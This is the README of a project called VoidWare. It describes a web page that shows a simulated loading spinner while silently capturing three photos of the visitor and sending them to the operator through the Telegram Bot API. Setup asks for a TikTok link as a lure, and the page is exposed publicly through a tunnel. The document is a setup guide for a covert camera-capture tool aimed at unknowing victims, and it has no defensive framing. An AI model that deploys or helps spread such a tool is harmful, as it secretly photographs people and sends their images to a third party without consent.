# VoidWare

## 🚀 Features

- Simulated loading spinner UI
- Captures 3 silent photos
- Sends images via Telegram Bot API
- Works on mobile and desktop
- Fully client-side + Python backend

```bash
git clone https://github.com/AbyssBite/VoidWare.git
cd VoidWare
python -m venv venv
source venv/bin/activate   # or venv\Scripts\activate
pip install -r requirements.txt
python init_env.py         # enter bot token, chat ID, TikTok link
python -m app.server # Keep this running
nkgrok http 3000 # In another terminal window